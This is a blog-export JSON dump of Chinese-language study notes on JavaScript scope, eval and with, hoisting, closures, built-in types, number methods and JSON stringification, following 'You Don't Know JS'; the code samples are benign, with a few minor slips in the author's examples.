href=\"#欺骗词法\" class=\"headerlink\" title=\"欺骗词法\"></a>欺骗词法</h3><p>这是一种在运行时“修改”作用域的词法。因此也叫欺骗词法</p><h5 id=\"EVAL\"><a href=\"#EVAL\" class=\"headerlink\" title=\"EVAL\"></a>EVAL</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo (str, a) &#123;</span><br><span class=\"line\">\teval(str)\t\t\t// 欺骗……</span><br><span class=\"line\">\tconsole.log(a, b)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var b = 2</span><br><span class=\"line\">foo(&quot;var b = 3, 1&quot;)</span><br></pre></td></tr></table></figure><p>eval的作用是将字符串转化成可执行的代码块。因此在执行eval代码时，前面的代码是以动态的插入进来的，达到词法作用域的修改。在严格模式之下，eval在运行时有自己的词法作用域，因此意味着在声明中无法修改所在的作用域。</p><h5 id=\"SETTIMEOUT\"><a href=\"#SETTIMEOUT\" class=\"headerlink\" title=\"SETTIMEOUT\"></a>SETTIMEOUT</h5><p>setTimeout第一个参数也是可以传入一个字符串。他将会默认将字符串转化成代码快。这种虽然稍微更安全一些（不会修改）但是也是要少用。避免使用</p><p><em>ps: 上述两者都有性能问题。由于在预编译时，javascript将所有的变量进行提升，在代码执行前写入作用域，大多数都是在函数执行前进行编译。而使用上述两种情况之后。由于无法确定当前作用域中是否有该种情况，于是将不会进行编译。而是在当前代码块执行编译的时候，才会进行作用域的写入，调节。这种情况将所有的javascript代码，引擎无法进行优化，因此性能极低。所以不推荐使用</em></p><h5 id=\"WITH\"><a href=\"#WITH\" class=\"headerlink\" title=\"WITH\"></a>WITH</h5><p>在严格模式之下使用报错。不推荐使用。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 好处</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">\ta:1,</span><br><span class=\"line\">\tb:2,</span><br><span class=\"line\">\tc:3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// 赋值很麻烦</span><br><span class=\"line\">obj1.a = 2</span><br><span class=\"line\">obj1.b = 3</span><br><span class=\"line\">obj1.c = 4</span><br><span class=\"line\">// 赋值相对快捷</span><br><span class=\"line\">with(obj) &#123;</span><br><span class=\"line\">\ta = 3</span><br><span class=\"line\">\tb = 4</span><br><span class=\"line\">\tc = 5</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// bad use</span><br><span class=\"line\">function foo(obj) &#123;</span><br><span class=\"line\">\twith(obj)&#123;</span><br><span class=\"line\">\t\ta = 2</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var o1 = &#123;</span><br><span class=\"line\">\ta:3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var o2 = &#123;</span><br><span class=\"line\">\tb:3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(o1)</span><br><span class=\"line\">console.log(o1.a) \t// 2</span><br><span class=\"line\">foo(o2)</span><br><span class=\"line\">console.log(o2.a)\t\t// undefined</span><br><span class=\"line\">console.log(a)\t\t\t// 2</span><br></pre></td></tr></table></figure><p></p><p>出现上述原因是什么？<br>在非严格模式中，第一种情况o1出现的原因是因为在当前作用域之下有a的这个属性，因此将a赋值过去。<br>第二种情况是因为由于o2中并没有找到a这个属性，而出现一种左值赋值操作。因此将a赋值给2,而a在非var情况之下赋值，变成全局变量出现。</p><h3 id=\"javascript在es6之前除try-catch没有块级作用域\"><a href=\"#javascript在es6之前除try-catch没有块级作用域\" class=\"headerlink\" title=\"javascript在es6之前除try-catch没有块级作用域\"></a>javascript在es6之前除try-catch没有块级作用域</h3><p>什么是块级作用域？之前我有写过一篇文章。<br>所谓块级作用域就是在打括号的包裹之下，里面的变量不外泻。即：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\tvar a = 0</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(a)\t// 0</span><br></pre></td></tr></table></figure><p></p><p>能在外部访问到的，都不是块级作用域。<br>因此在es5之前，对于变量的使用，都要尽可能的使用var来达到变量不会冲突的情况。不然很可能使用到上一级的变量，导致出错。</p><h5 id=\"ES6中的LET\"><a href=\"#ES6中的LET\" class=\"headerlink\" title=\"ES6中的LET\"></a>ES6中的LET</h5><p>出现let之后，便有了块级作用域。这种情况为javascript更容易</p><h3 id=\"提升\"><a href=\"#提升\" class=\"headerlink\" title=\"提升\"></a>提升</h3><p>文章之前也提到过。由于变量在引擎中是一个先写入作用域中，再将变量赋值的一个过程。所以有奇妙的提升。<br>例如：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo()</span><br><span class=\"line\">function foo () &#123;</span><br><span class=\"line\">\tconsole.log(&apos;hello&apos;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在其他语言中，这样写代码是会报错的，但是在javascript中则不会。因为函数声明中，函数名称是一个变量。函数表达式则不会。在首先代码编译阶段，foo函数首先被提升到作用域中-&gt;然后执行代码。foo函数-&gt;引擎中发现作用域中有foo函数-&gt;引擎执行foo函数</p><h3 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h3><p>闭包是为了函数外部使用函数内部变量，出现的一个名词<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tvar a = 2;</span><br><span class=\"line\">\tfunction bar () &#123;</span><br><span class=\"line\">\t\tconsole.log(a)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn bar</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var baz = foo()</span><br><span class=\"line\">baz()\t// 2</span><br></pre></td></tr></table></figure><p></p><p>这种就是闭包。闭包的详细，之前重读javascript一书中有写过。<br><em>ps： 所有的javascript的回调都是闭包</em></p><h3 id=\"模块机制\"><a href=\"#模块机制\" class=\"headerlink\" title=\"模块机制\"></a>模块机制</h3><p>之前使用模块机制，是框架中代码写入的。而现代机制使用commonjs的规范使用的。</p><h5 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h5><p>学习到javascript第一章之后，发现很多javascript的一些现象可以通过底层来解释，真是太棒了！很开心的学玩了这一章节，明白了性能问题出现的原因，以及词法作用域的底层原理。还有javascript代码的执行。不禁感叹v8引擎的强大，对javascript的优化简直棒极了！对深入学习javascript又更上一层楼</p>"},{"title":"你不知道的javascript————类型和语法","date":"2017-12-17T13:17:15.000Z","dir":"javascript","keywords":"你不知道的javascript————类型和语法","_content":"### 类型\n#### 七个内置类型\n*   空值 (null)\n*   未定义 (undefined)\n*   布尔值 (boolean)\n*   数字 (number)\n*   字符串 (string)\n*   对象 (object)\n*   符号 (symbol)\n\n#### 检测各个类型\n```\ntypeof undefined\t\t=== \"undefined\" \t// true\ntypeof true \t\t\t\t=== \"boolean\"\t\t\t// true\ntypeof 42\t\t\t\t\t\t=== \"number\"\t\t\t// true\ntypeof \"42\" \t\t\t\t=== \"string\"\t\t\t// true\ntypeof {\"life\": 42}\t=== \"object\"\t\t\t// true\ntypeof Symbol\t\t\t\t=== \"symbol\"\t\t\t// true\ntypeof null \t\t\t\t=== \"object\"\t\t\t// true\ntypeof function(){}\t=== \"function\" \t\t// true\ntypeof [0,1]\t\t\t\t=== \"object\"\t\t\t// true\n```\n本身null对象里面代表空值，所以其为object也是合理。但应该typeof null 返回是 null才符合常理。由于这个bug在许多代码中已经这样做了，所以重新修回会导致更严重的bug。因此被修回的可能性很小。\n因此，对null应该采用复合查询语句\n```\nvar a = null;\n(!a && typeof a === \"object\")\t// true\n\n```\n而对于typeof function(){} === “function” 而言，因为本身function是object的一个子类型，具体的说，函数是一个可调用对象。\n且typeof [0,1] === “object”,因为数组也是object的一个子类型\n\n_ps：由于所有的typeof都会返回一个string，所以 typeof typeof 42会是”string”，因为typeof 42首先会变成一个“number”，是一个string类型，所以typeof “number”是一个string_\n#### undefined && undeclared && typeof undeclared\n```\nvar a;\ntypeof a;\t\t\t// \"undefined\"\nvar b = 42;\nvar c;\nb=c;\ntypeof c\t\t\t// \"undefined\"\ntypeof b\t\t\t// \"undefined\"\na\t\t\t\t\t\t\t// \"undefined\"\nd\t\t\t\t\t\t\t// \"VM422:1 Uncaught ReferenceError: d is not defined at <anonymous>:1:1\"\n```\n从上述可以看出，undefined 和 undeclared 是两码事。undefined意思是定义但未赋值，或者赋值为undefined，而undeclared是未定义。因此两者不能画等号\n#### typeof undeclared\n```\ntypeof a\t\t\t// \"undefined\"\n```\n出现这种原因因为typeof有一个特殊的安全防范机制，因为多个脚本文件会在共享的全局变量命名空间中加载变量。如果typeof一个未命名的报错，会导致整段程序停止运行。对于typeof来检查undeclared变量，有时是一个不错的办法。\n\n#### 值\n##### 数组\njs的数组可以容纳任何的值，甚至可以是另一个数组，因此多维数组就是这种方式来实现的。\n由于数组本身就是一个特殊的对象，所以数组也可以包含字符串键值和属性，但是这并不计算在数组长度内。\n```\nvar a = [];\na[0] = 1;\na[\"foobar\"] = 1;\na.length \t\t\t// 1\na[\"foobar\"];\t// 1\na.foobar\t\t\t// 1\na[\"13\"] = 42;\na.length\t\t// 14\n```\n为什么会这样呢？由于本身数组就是一个对象的子集合，因此在[]中，使用十进制字符串数字会直接强制类型转化成数字。a[“13”]就变成了a[13],因此在数组内会直接将其长度变化成14。同理，在属性给foobar加到a数组中，因为数组的界定是有数字来确定下标位置，而length是最后一个下标数字+1，因而加入的非数字就不在长度里面了。\n\n##### 类数组\n对于es5而言，可以用slice,concat来实现类数组转数组，对于es6而言，可以用Array.from()来实现从类数组转换成数组。\n\n##### 字符串\n字符串的一些方法indexOf(),concat(),toUpperCase(),reverse()等等。\n字符串的一些方法：\n|方法|描述|\n|---|---|\n|charAt() | 返回指定索引位置的字符|\n|charCodeAt() | 返回指定索引位置字符的 Unicode 值|\n|concat() | 连接两个或多个字符串，返回连接后的字符串|\n|fromCharCode() | 将 Unicode 转换为字符串|\n|indexOf() | 返回字符串中检索指定字符第一次出现的位置|\n|lastIndexOf() | 返回字符串中检索指定字符最后一次出现的位置|\n|localeCompare() | 用本地特定的顺序来比较两个字符串|\n|match() | 找到一个或多个正则表达式的匹配|\n|replace() | 替换与正则表达式匹配的子串|\n|search() | 检索与正则表达式相匹配的值|\n|slice() | 提取字符串的片断，并在新的字符串中返回被提取的部分|\n|split() | 把字符串分割为子字符串数组|\n|substr() | 从起始索引号提取字符串中指定数目的字符|\n|substring() | 提取字符串中两个指定的索引号之间的字符|\n|toLocaleLowerCase() | 根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射|\n|toLocaleUpperCase() | 根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射|\n|toLowerCase() | 把字符串转换为小写|\n|toString() | 返回字符串对象值|\n|toUpperCase() | 把字符串转换为大写|\n|trim() | 移除字符串首尾空白|\n|valueOf() | 返回某个字符串对象的原始值|\n\n如果需要经常一字符数组的方式来处理字符串的话，倒不如直接用数组。这样就不用在字符串和数组之间来回折腾。可以在有需要的时候使用join(“”)来将字符串数组转换为字符串\n\n#### 数字\n和大部分编程语言一样，js中的数字是基于IEE754标准来实现的。该标准通常也被称为“浮点数”。而js使用的是双精度单位(64位)格式。所以也会有iee754标准的通病，即浮点数之间相加会有奇妙的现象。\n数字的一些方法：\ntoExponential()\n```\nvar a = 5E10\t\t\t// 可以通过这种方式赋值\na\t\t\t\t\t\t\t\t\t// 50000000000\na.toExponential()\t// \"5e+10\"\nvar b = a * a;\nb \t\t\t\t\t\t\t\t// 2.5e+21\n```\t\ntoFixed()\t\t\t\t\t// 精度\n```bash\nvar a = 42.59\na.toFixed(1)\t\t\t// \"42.6\"\n// 无效\n42.toFixed(3)\t\t\t// Uncaught SyntaxError: Invalid or unexpected token\n// 有效\n42..toFixed(3)\t\t// \"42.000\"\n(42).toFixed(3)\t\t// \"42.000\"\n0.42.toFixed(3)\t\t// \"0.420\"\n42 .toFixed(3)\t\t// \"42.000\"\n```\n因为.被视为常量42.的一部分。所以没有.属性访问运算符来调用toFixed()\ntoPrecision() // 执行有效位数的显示位数\n```\nvar a = 42.59\na.toPrecision(1)\t\t// \"4e+1\"\na.toPrecision(2)\t\t// \"43\"\na.toPrecision(3)\t\t// \"42.6\"\n``` \nes6支持新格式\n```bash\n0B\t\t0b\t\t\t\t\t// 二进制\n0O\t\t0o\t\t\t\t\t// 八进制\n0X\t\t0x\t\t\t\t\t// 十六进制\n```\nEPSILON // 最小精度\n```\nif(((0.1 + 0.2) - 0.3)<Number.EPSILON){\n}else{\n}\n```\nMAX_VALUE\nMAX_SAFE_INTEGER\n```\nNumber.MAX_VALUE\t\t\t\t\t\t// 1.7976931348623157e+308\nNumber.MAX_SAFE_INTEGER\t\t\t// 9007199254740991\n```\nisInteger\n```\nNumber.isInteger(1)\t\t\t\t\t// true\nNumber.isInteger(1.1)\t\t\t\t// false\nNumber.isInteger(1.0)\t\t\t\t// true\n```\n#### 特殊数值\n##### undefined\n```\nvar undefined = 2\nundefined \t// 2\n\n```\n_ps：永远不要重新定义undefined_\n#### void 运算符\n在不需要返回值的时候，可以void掉\n```\nif(ready){\n\treturn void setTimeout(..)\n}\n```\n这样做可以将setTimeout返回的id给void掉\n#### NaN\nNaN是一个数值型。意思指的是不是一个数值，并且NaN != NaN。可以使用isNaN来判断是否是NaN\n```\nNumber.isNaN(NaN)\t\t\t\t// true\nNumber.isNaN(1)\t\t\t\t\t// false\n\n```\n#### 0值\n加法和减法运算永远不会有-0\n使用toString和JSON.stringify()会将-0变成0\n```\n0/-1\t\t\t// -0\n0/1\t\t\t\t// 0\nvar a = -0\na \t\t\t\t// -0\na.toString()\t\t// 0\nJSON.stringify(a)\t// 0\n```\n#### 特殊等式\nObject.is\nObject.is 可以判断是+0还是-0,而且可以判断是否为NaN\n```\nObject.is(+0, -0)\t// false\nObject.is(NaN, NaN)\t\t// true\n\n```\n#### 值和引用\nnull，undefined，字符串，数字，布尔，symbol都是简单值\n对象，函数都是复杂值\n```\nfunction foo(x) {\n\tx.push(4);\t\n\tx;\t\t\t\t\t\t\t// [1,2,3,4]\n\tx = [4,5,6];\n\tx.push(7);\n\tx;\t\t\t\t\t\t\t// [4,5,6,7]\n}\nvar a = [1,2,3];\nfoo(a);\na;\t\t\t\t// [1,2,3,4]\n由于一开始是引用赋值，然后x是a对应数组的一个引用，x在push一个4之后，重新引用一个新的数组，4.5.6,而a引用的数组变化成了[1,2,3,4];\nfunction foo(x){\n\tx.push(4);\n\tx;\t\t\t\t// [1,2,3,4]\n\tx.length = 0;\t\n\tx.push(4,5,6,7)\n\tx;\t\t\t\t// [4,5,6,7]\n}\nvar a = [1,2,3]\nfoo(a)\na;\t\t// [4,5,6,7]\n和上面一开始一样，只是后面在x.length=0后，再push进去了4,5,6,7。所以x的引用没变，还是和a引用的一样。所以a和x一同变化\n```\n_ps：我们无法自行决定使用值赋值还是引用赋值，一切由值的类型决定_\n```\nfunction foo(warpper){\n\twarpper.a = 42\n}\nvar obj = {\n\ta: 1\n}\nfoo(obj)\nobj.a\t\t\t//42\nfunction foo (x) {\n\tx = x+1;\n\tx;\t\t\t\t// 3\n}\nvar a = 2;\nvar b = new Number(a);\nfoo(b)\nconsole.log(b)\t\t// 2\n前者是引用赋值，后者是值赋值\n```\n#### 原生函数\n* String\n* Number\n* Boolean\n* Array\n* Object\n* Function\n* RegExp\n* Date\n* Error\n* Symbol\n\n#### 内部属性[[Class]]\n所有typeof返回值为“Object”的对象(如数组)都包含一个内部属性[[Class]]，这个属性通常无法直接访问，一般通过Object.prototype.toString查看\n```\nObject.prototype.toString.call([123])\t\t\t// \"[object Array]\"\nObject.prototype.toString.call(null)\t\t\t// \"[object Null]\"\nObject.prototype.toString.call(true)\t\t\t// \"[object Boolean]\"\nObject.prototype.toString.call(undefined)\t// \"[object Undefined]\"\n```\n虽然Null和undefined这样的原声构造函数不存在，但是内部Class属性值仍然是Null和Undefined。基本类型值被各自的封装对象自动包装，所以他们的内部[[Class]]属性值为Boolean。\n#### 封装对象包装\n```\nvar a = \"abc\";\nconsole.log(a);\t\t// \"abc\"\na.length \t\t\t\t\t// \"3\"\nvar b = new String(\"abc\")\nconsole.log(b)\t\t// String {[[PrimitiveValue]]: \"abc\"} 0:\"a\" 1:\"b\" 2:\"c\" length:3 __proto__:String [[PrimitiveValue]]:\"abc\"\n```\n只是创建字面量基本值的时候，并没有其他的方法。当在使用其对象方法时，需要通过封装对象才能访问，此时js会自动为基本类型值包装(box或者wrap)一个封装对象。\n但是为经常用到的.length方法直接new一个对象也不是一个好办法，因为浏览器对.length这样的常见情况做了优化，直接使用封装对象来“提前优化”反而会降低执行效率。\n\n#### 封装对象的释疑\n例如：\n```\nvar a = new Boolean(false);\nif (!a){\n\tconsole.log(...)\t\t\t// 执行不到这里\n}\n```\n因为建立一个a之后，这个对象得到的是真值，得到的结果和使用false相反\n\n自行封装可以使用Object\n```\nvar a = \"abc\"\nvar b = new String (a);\nvar c = Object(a);\ntypeof a \t\t\t\t// \"stirng\"\ntypeof b\t\t\t\t// \"object\"\ntypeof c\t\t\t\t// \"object\"\nb instanceof String \t// true\nc instanceof String \t// true\nObject.prototype.toString.call(b);\t\t// \"[object String]\"\nObject.prototype.toString.call(c);\t\t// \"[object String]\"\n```\n一般不直接使用封装对象，但是他们偶尔也会派上用场\n#### 拆封\n如果想得到封装对象里面的值，可以使用valueOf函数，隐式拆封也是调用了valueOf函数：\n```\nvar a = new String(\"abc\")\nvar b = new Number(11)\nvar c = new Boolean(true)\na.valueOf()\t// \"abc\"\nb.valueOf()\t// 11\nc.valueOf()\t// true\nvar d = a + \"\";\nconsole.log(d)\t\t\t\t// \"abc\"\ntypeof a \t\t\t// \"object\"\ntypeof d \t\t\t// \"string\"\n\n```\n#### 原生函数作为构造函数\n四种方式创建应该尽量避免构造函数，除非十分必要\n* array 数组\n* object 对象\n* function 函数\n* RegExp 正则表达式\n### ARRAY(..)\n调用Array构造函数时，可以不需要加上new，效果一致。）且Array构造函数纸袋一个数字作为参数的时候，这个参数会当作数组的预设长度，而不是充当其中的一个元素\n```\n// 效果一致\nvar a = new Array(1,2,3);\na\t\t\t// [1,2,3]\nvar b = Array(1,2,3)\nb \t\t// [1,2,3]\nvar c = [1,2,3]\nc \t\t// [1,2,3]\n// 不同方式创建出来空数组效果不一致\nvar d = new Array(3);\nconsole.log(d)\t\t\t// chrome上： (3) [empty × 3]\nd.length\t\t\t\t\t\t// 3\nvar e = [undefined,undefined,undefined];\nconsole.log(e)\t\t\t// (3) [undefined, undefined, undefined]\nvar f = []\t\t\t\t\t\nf.length = 3;\nconsole.log(f);\t\t\t// chrome上： (3) [empty × 3]\n// 直接以，创建。虽然长度是3令人费解，但是可以更好的复制粘贴\nvar g = [,,,]\nconsole.log(g)\t\t\t// chrome上： (3) [empty × 3]\n\n```\n由于创建方式不同，导致在chrome下不一致的显示，但是更难过的是，他们有时相同，有时呵呵\n```\nvar a = new Array(3)\nvar b = [undefined,undefined,undefined]\na.join(\"-\")\t\t\t// \"--\"\nb.join(\"-\")\t\t\t// \"--\"\na.map(function(v,i){return i})\t\t// (3) [empty × 3]\na.map(function(v,i){return i})\t\t// [0, 1, 2]\n```\na.map之所以执行失败，是因为a中是没有元素的，而b里面有undefied。\n**而join首先假定数组不为空，然后通过length属性值来便利其中的元素，而map并不做这种假定**\n可以通过这种方式来创建包含undefined单元的数组\n```\nvar a = Array.apply(null, {length:3});\nconsole.log(a)\t\t\t// (3) [undefined, undefined, undefined]\n```\n_PS:永远不要创建和使用空单元数组_\n\n#### OBJECT、FUNCTION、REGEXP\n**除非玩不得已，尽量不要使用他们**\n```\nvar c = new Object();\nc.foo = \"bar\";\nc\t\t\t\t// {foo:\"bar\"}\nvar d = {foo:\"bar\"}\nd\t\t\t\t// {foo:\"bar\"}\nvar e = new Function(\"a\",\"return a * 2\");\nvar f = function(a){return a*2};\nfunction g(a){return a*2}\nvar h = new RegExp(\"^a*b+\",\"g\");\nvar i = /^a*b+/g\n```\njavascript对常量形式的代码会对他们进行预编译和缓存！\n#### DATE、ERROR\n相较于其他原生构造函数，Date、Error的用处比其他的更多，因为没有其他对用的常量形式来作为他们的替代\n引入生成当前时间戳，使用\n```\nDate.now()\n// 使用new来生成时间\nnew Date()\n// Thu Jan 04 2018 06:47:59 GMT+0800 (CST)\n\n```\n错误对象通常与throw一起使用\n```\nfunction foo(x){\n\tif(!x){\n\t\tthrow new Error(\"///\");\n\t}\n\t// -\n}\n```\n#### SYMBOL\nSymbol可作为私有属性是一种简单标量基本类型\n\n### 强制类型转换\n#### 抽象值操作\n如果对象有自己的toString()方法，字符串化就会调用该方法并使用其返回值。\n数组的默认toString方法经过了重新定义\n```\nvar a = [1,2,3]\na.toString()\t\t// \"1,2,3\"\n\n```\n#### JSON 字符串化\nJSON.stringify(42) // “42”\nJSON.stringify(“42”) // “”42””\nJSON.stringify(null) // “null”\nJSON.stringify(true) // “true”\n\n_JSON.stringify()在对象中遇到undefined、function和symbol时会自动将其忽略，在数组中则会返回null_\n```\nJSON.stringify(undefined)\t\t\t// undefined\nJSON.stringify(function(){})\t// undefined\nJSON.stringify([1,undefined, function(){},4])\t// \"[1,null,null,4]\"\nJSON.stringify({a:2, b: function(){}})\t\t\t\t// \"{\"a\":2}\"\n```\n循环引用会出错\n```\nvar o = {};\nvar a = {\n\tb:42,\n\tc:o,\n\td:function(){}\n}\no.e = a\nJSON.stringify(a)\na.toJSON=function(){\n\treturn {b:this.b}\n}\nJSON.stringify(a)\n# Uncaught TypeError: Converting circular structure to JSON\n#     at JSON.stringify (<anonymous>)\n#     at <anonymous>:8:6\n```","source":"_posts/you-dont-konwn-javascript-type.md","raw":"---\ntitle: 你不知道的javascript————类型和语法\ndate: 2017-12-17 21:17:15\ntags: javascript\ndir: javascript\nkeywords: 你不知道的javascript————类型和语法\n---\n### 类型\n#### 七个内置类型\n*   空值 (null)\n*   未定义 (undefined)\n*   布尔值 (boolean)\n*   数字 (number)\n*   字符串 (string)\n*   对象 (object)\n*   符号 (symbol)\n\n#### 检测各个类型\n```\ntypeof undefined\t\t=== \"undefined\" \t// true\ntypeof true \t\t\t\t=== \"boolean\"\t\t\t// true\ntypeof 42\t\t\t\t\t\t=== \"number\"\t\t\t// true\ntypeof \"42\" \t\t\t\t=== \"string\"\t\t\t// true\ntypeof {\"life\": 42}\t=== \"object\"\t\t\t// true\ntypeof Symbol\t\t\t\t=== \"symbol\"\t\t\t// true\ntypeof null \t\t\t\t=== \"object\"\t\t\t// true\ntypeof function(){}\t=== \"function\" \t\t// true\ntypeof [0,1]\t\t\t\t=== \"object\"\t\t\t// true\n```\n本身null对象里面代表空值，所以其为object也是合理。但应该typeof null 返回是 null才符合常理。由于这个bug在许多代码中已经这样做了，所以重新修回会导致更严重的bug。因此被修回的可能性很小。\n因此，对null应该采用复合查询语句\n```\nvar a = null;\n(!a && typeof a === \"object\")\t// true\n\n```\n而对于typeof function(){} === “function” 而言，因为本身function是object的一个子类型，具体的说，函数是一个可调用对象。\n且typeof [0,1] === “object”,因为数组也是object的一个子类型\n\n_ps：由于所有的typeof都会返回一个string，所以 typeof typeof 42会是”string”，因为typeof 42首先会变成一个“number”，是一个string类型，所以typeof “number”是一个string_\n#### undefined && undeclared && typeof undeclared\n```\nvar a;\ntypeof a;\t\t\t// \"undefined\"\nvar b = 42;\nvar c;\nb=c;\ntypeof c\t\t\t// \"undefined\"\ntypeof b\t\t\t// \"undefined\"\na\t\t\t\t\t\t\t// \"undefined\"\nd\t\t\t\t\t\t\t// \"VM422:1 Uncaught ReferenceError: d is not defined at <anonymous>:1:1\"\n```\n从上述可以看出，undefined 和 undeclared 是两码事。undefined意思是定义但未赋值，或者赋值为undefined，而undeclared是未定义。因此两者不能画等号\n#### typeof undeclared\n```\ntypeof a\t\t\t// \"undefined\"\n```\n出现这种原因因为typeof有一个特殊的安全防范机制，因为多个脚本文件会在共享的全局变量命名空间中加载变量。如果typeof一个未命名的报错，会导致整段程序停止运行。对于typeof来检查undeclared变量，有时是一个不错的办法。\n\n#### 值\n##### 数组\njs的数组可以容纳任何的值，甚至可以是另一个数组，因此多维数组就是这种方式来实现的。\n由于数组本身就是一个特殊的对象，所以数组也可以包含字符串键值和属性，但是这并不计算在数组长度内。\n```\nvar a = [];\na[0] = 1;\na[\"foobar\"] = 1;\na.length \t\t\t// 1\na[\"foobar\"];\t// 1\na.foobar\t\t\t// 1\na[\"13\"] = 42;\na.length\t\t// 14\n```\n为什么会这样呢？由于本身数组就是一个对象的子集合，因此在[]中，使用十进制字符串数字会直接强制类型转化成数字。a[“13”]就变成了a[13],因此在数组内会直接将其长度变化成14。同理，在属性给foobar加到a数组中，因为数组的界定是有数字来确定下标位置，而length是最后一个下标数字+1，因而加入的非数字就不在长度里面了。\n\n##### 类数组\n对于es5而言，可以用slice,concat来实现类数组转数组，对于es6而言，可以用Array.from()来实现从类数组转换成数组。\n\n##### 字符串\n字符串的一些方法indexOf(),concat(),toUpperCase(),reverse()等等。\n字符串的一些方法：\n|方法|描述|\n|---|---|\n|charAt() | 返回指定索引位置的字符|\n|charCodeAt() | 返回指定索引位置字符的 Unicode 值|\n|concat() | 连接两个或多个字符串，返回连接后的字符串|\n|fromCharCode() | 将 Unicode 转换为字符串|\n|indexOf() | 返回字符串中检索指定字符第一次出现的位置|\n|lastIndexOf() | 返回字符串中检索指定字符最后一次出现的位置|\n|localeCompare() | 用本地特定的顺序来比较两个字符串|\n|match() | 找到一个或多个正则表达式的匹配|\n|replace() | 替换与正则表达式匹配的子串|\n|search() | 检索与正则表达式相匹配的值|\n|slice() | 提取字符串的片断，并在新的字符串中返回被提取的部分|\n|split() | 把字符串分割为子字符串数组|\n|substr() | 从起始索引号提取字符串中指定数目的字符|\n|substring() | 提取字符串中两个指定的索引号之间的字符|\n|toLocaleLowerCase() | 根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射|\n|toLocaleUpperCase() | 根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射|\n|toLowerCase() | 把字符串转换为小写|\n|toString() | 返回字符串对象值|\n|toUpperCase() | 把字符串转换为大写|\n|trim() | 移除字符串首尾空白|\n|valueOf() | 返回某个字符串对象的原始值|\n\n如果需要经常一字符数组的方式来处理字符串的话，倒不如直接用数组。这样就不用在字符串和数组之间来回折腾。可以在有需要的时候使用join(“”)来将字符串数组转换为字符串\n\n#### 数字\n和大部分编程语言一样，js中的数字是基于IEE754标准来实现的。该标准通常也被称为“浮点数”。而js使用的是双精度单位(64位)格式。所以也会有iee754标准的通病，即浮点数之间相加会有奇妙的现象。\n数字的一些方法：\ntoExponential()\n```\nvar a = 5E10\t\t\t// 可以通过这种方式赋值\na\t\t\t\t\t\t\t\t\t// 50000000000\na.toExponential()\t// \"5e+10\"\nvar b = a * a;\nb \t\t\t\t\t\t\t\t// 2.5e+21\n```\t\ntoFixed()\t\t\t\t\t// 精度\n```bash\nvar a = 42.59\na.toFixed(1)\t\t\t// \"42.6\"\n// 无效\n42.toFixed(3)\t\t\t// Uncaught SyntaxError: Invalid or unexpected token\n// 有效\n42..toFixed(3)\t\t// \"42.000\"\n(42).toFixed(3)\t\t// \"42.000\"\n0.42.toFixed(3)\t\t// \"0.420\"\n42 .toFixed(3)\t\t// \"42.000\"\n```\n因为.被视为常量42.的一部分。所以没有.属性访问运算符来调用toFixed()\ntoPrecision() // 执行有效位数的显示位数\n```\nvar a = 42.59\na.toPrecision(1)\t\t// \"4e+1\"\na.toPrecision(2)\t\t// \"43\"\na.toPrecision(3)\t\t// \"42.6\"\n``` \nes6支持新格式\n```bash\n0B\t\t0b\t\t\t\t\t// 二进制\n0O\t\t0o\t\t\t\t\t// 